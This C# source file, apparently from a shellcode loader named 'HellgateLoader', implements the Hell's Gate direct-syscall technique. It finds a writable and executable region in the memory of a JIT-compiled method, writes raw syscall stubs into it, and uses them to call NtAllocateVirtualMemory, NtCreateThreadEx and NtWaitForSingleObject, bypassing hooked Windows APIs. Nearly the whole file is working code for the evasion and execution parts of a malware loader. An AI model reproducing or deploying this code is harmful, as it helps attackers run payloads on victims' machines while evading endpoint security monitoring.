using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using HellgateLoader.SyscallRes;

namespace HellgateLoader.SyscallRes
{
    class SyscallFunctions
    {

        private IntPtr MangedMethodAddress { get; set; } = IntPtr.Zero;
        private IntPtr UnmanagedMethodAddress { get; set; } = IntPtr.Zero;
        private object Mutant { get; set; } = new object();


        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private static UInt32 Gate()
        {
            return new UInt32();
        }

        public bool GenerateRWXMemorySegment()
        {
            // Find and JIT the method
            MethodInfo method = typeof(SyscallFunctions).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null)
            {
                // Util.LogError("Unable to find the method");
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            // Get the address of the function and check if first opcode == JMP
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            if (Marshal.ReadByte(pMethod) != 0xe9)
            {
                return false;
            }

            // Get address of jited method and stack alignment 
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;
            while (addr % 16 != 0)
                addr++;

            this.MangedMethodAddress = method.MethodHandle.GetFunctionPointer();
            this.UnmanagedMethodAddress = (IntPtr)addr;
            return true;
        }

        private T NtInvocation<T>(byte[] Syscall_byte) where T : Delegate
        {
            if (Syscall_byte.Length == 0)
            {
                return null;
            }

            Marshal.Copy(Syscall_byte, 0, this.UnmanagedMethodAddress, Syscall_byte.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(this.UnmanagedMethodAddress);
        }

        public UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
        {
            lock (Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtAllocateVirtualMemory".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtAllocateVirtualMemory Func = NtInvocation<SyscallDelegates.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        public UInt32 NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtCreateThreadEx".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtCreateThreadEx Func = NtInvocation<SyscallDelegates.NtCreateThreadEx>(syscall);
                return Func(out hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        public UInt32 NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtWaitForSingleObject".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtWaitForSingleObject Func = NtInvocation<SyscallDelegates.NtWaitForSingleObject>(syscall);
                return Func(Object, Alertable, Timeout);
            }
        }
    }
}
